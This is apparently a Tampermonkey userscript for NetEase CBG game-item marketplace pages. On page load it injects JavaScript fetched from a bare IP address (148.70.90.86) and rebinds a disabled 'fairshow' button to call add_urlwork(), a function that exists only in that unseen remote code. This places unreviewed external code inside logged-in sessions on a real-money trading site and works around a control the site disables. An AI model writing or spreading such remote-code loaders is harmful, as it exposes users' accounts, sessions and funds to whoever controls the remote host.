// ==UserScript==
// @name         加载JS并添加点击事件
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  try to take over the world!
// @author       You
// @author       Ten.Light
// @match        https://lh.cbg.163.com/cgi/mweb/equip/*
// @match        https://dhxy.cbg.163.com/cgi/mweb/equip/*
// @match        https://my.cbg.163.com/cgi/mweb/equip/*
// @match        https://yys.cbg.163.com/cgi/mweb/equip/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/398274/%E5%8A%A0%E8%BD%BDJS%E5%B9%B6%E6%B7%BB%E5%8A%A0%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6.user.js
// @updateURL https://update.greasyfork.org/scripts/398274/%E5%8A%A0%E8%BD%BDJS%E5%B9%B6%E6%B7%BB%E5%8A%A0%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6.meta.js
// ==/UserScript==

(function() {
    'use strict';
    loadPayJs("addurl","https://148.70.90.86/js/addurl.js");
    var func_init = setInterval(initJs,1000);
    
    function loadPayJs(id,newJS)
    {
        var scriptObj = document.createElement("script");
        scriptObj.src = newJS;
        scriptObj.type = "text/javascript";
        scriptObj.id = id;
        document.getElementsByTagName("head")[0].appendChild(scriptObj);
    }
    function initJs()
    {
        try {
            document.getElementsByClassName("btn btn-large disabled btn-fairshow")[0].setAttribute("onclick", "add_urlwork()");
            window.clearInterval(func_init);
             console.log(111);
        } catch (e) {

             console.log(222);

    }
}



    // Your code here...
})();